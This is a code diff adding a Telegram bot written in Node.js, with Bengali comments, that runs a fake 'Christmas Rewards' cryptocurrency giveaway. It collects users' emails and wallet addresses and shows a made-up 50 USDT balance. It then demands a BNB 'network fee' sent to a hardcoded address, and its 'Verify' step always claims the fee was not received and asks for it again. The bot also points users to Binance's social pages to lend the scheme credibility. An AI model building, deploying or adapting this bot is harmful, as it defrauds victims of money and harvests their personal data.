@@ -1,0 +1,86 @@
+const { Telegraf, Markup } = require('telegraf');
+const express = require('express');
+const app = express();
+
+const BOT_TOKEN = process.env.BOT_TOKEN;
+const bot = new Telegraf(BOT_TOKEN);
+
+// সিম্পল ডাটাবেস (বট রিস্টার্ট দিলে এটি মুছে যাবে, তবে রেন্ডারে কাজের জন্য ঠিক আছে)
+const userData = {};
+
+// ১. স্টার্ট কমান্ড
+bot.start((ctx) => {
+    ctx.reply(`👋 Hello, ${ctx.from.first_name}! Welcome to Christmas Rewards Bot\n\n🎁 Joining Reward: 50 USDT\n👥 Each Referral: 5 USDT\n\n📢 Must Complete Mandatory Tasks:\n\n🔹 Join our Telegram Channel: @Christmas_Rewards\n\n🗒️ After completing task click on [Continue] to proceed`, 
+    Markup.keyboard([['🟢 Continue']]).resize());
+});
+
+// ২. কন্টিনিউ বাটন
+bot.hears('🟢 Continue', (ctx) => {
+    ctx.reply('🔹 Join @Christmas_Rewards\n\nAfter completing task click on [Done]', 
+    Markup.keyboard([['✅ Done']]).resize());
+});
+
+// ৩. ডান বাটন (ইমেইল চাওয়া)
+bot.hears('✅ Done', (ctx) => {
+    userData[ctx.from.id] = { step: 'email' };
+    ctx.reply('🔹 Follow Binance Twitter Page (https://twitter.com/binance)\n🔹 Follow Binance Instagram Page (https://www.instagram.com/binance)\n\nSubmit Your Email ID To Proceed:', Markup.removeKeyboard());
+});
+
+// ৪. টেক্সট হ্যান্ডলার (ইমেইল এবং ওয়ালেট অ্যাড্রেস ইনপুট নেওয়ার জন্য)
+bot.on('text', async (ctx) => {
+    const text = ctx.message.text;
+    const userId = ctx.from.id;
+
+    if (userData[userId]?.step === 'email') {
+        userData[userId].email = text;
+        userData[userId].step = 'wallet';
+        ctx.reply('➡️ Submit Your USDT (BEP-20) Wallet Address\n\nMust Submit Valid Wallet Address.');
+    } 
+    else if (userData[userId]?.step === 'wallet') {
+        userData[userId].wallet = text;
+        userData[userId].step = 'completed';
+        ctx.reply('🎉 Congratulations, you have successfully joined the Christmas Rewards.', 
+        Markup.keyboard([['💰 Balance', '↘️ Withdraw']]).resize());
+    }
+    else if (text === '💰 Balance') {
+        ctx.reply(`🤴 User : ${ctx.from.first_name}\n\nYour Balance: 50 USDT\n\n📝 If you submitted wrong data then you can restart the bot by clicking /start`);
+    }
+    else if (text === '↘️ Withdraw') {
+        ctx.reply('✅ Now Submit Your USDT (BEP-20) Wallet Address to confirm withdrawal:');
+        userData[userId].step = 'withdraw_wallet';
+    }
+    else if (userData[userId]?.step === 'withdraw_wallet') {
+        ctx.reply(`➡️ Your Balance 50.00 USDT\n\nPlease click on Confirm for proceed your USDT withdrawal`, 
+        Markup.keyboard([['✅ Confirm']]).resize());
+    }
+    else if (text === '✅ Confirm') {
+        ctx.reply(`📃 Please send 0.0108 BNB Smartchain as bscscan network fee for withdraw your USDT funds.\n\nAddress :- 0xef27672cf6da6f7a90fc5a87e9d93e72e2ac68e6\n\n➡️ once the server receives your transaction fee, you will receive your USDT within 2-3 minutes.\n\n⚠️ Note: After send transaction fee must click on [Verify] button`, 
+        Markup.keyboard([['☑️ Verify']]).resize());
+    }
+   else if (text === '☑️ Verify') {
+        ctx.reply('🖐️ Hold on checking your transaction......');
+        
+        setTimeout(() => {
+            // প্রথমে এরর মেসেজ পাঠাবে
+            ctx.reply('❎ We haven\'t received transaction fee.');
+            
+            // এর ঠিক পরেই আবার পেমেন্ট ইনস্ট্রাকশন পাঠিয়ে দেবে
+            setTimeout(() => {
+                ctx.reply(`📃 Please send 0.0108 BNB Smartchain as bscscan network fee for withdraw your USDT funds.\n\nAddress :- 0xef27672cf6da6f7a90fc5a87e9d93e72e2ac68e6\n\n➡️ once the server receives your transaction fee, you will receive your USDT within 2-3 minutes.\n\n⚠️ Note: After send transaction fee must click on [Verify] button`, 
+                Markup.keyboard([['☑️ Verify']]).resize());
+            }, 1000); // ১ সেকেন্ড বিরতি দিয়ে ইনস্ট্রাকশন আসবে
+
+        }, 3000); // ৩ সেকেন্ড চেকিং দেখাবে
+    }
+});
+
+// Render Health Check
+const PORT = process.env.PORT || 3000;
+app.get('/', (req, res) => res.send('Bot is Live!'));
+app.listen(PORT, () => {
+    console.log(`Server is running on port ${PORT}`);
+    bot.launch();
+});
+
+// Error handling
+bot.catch((err) => console.log('Ooops', err));
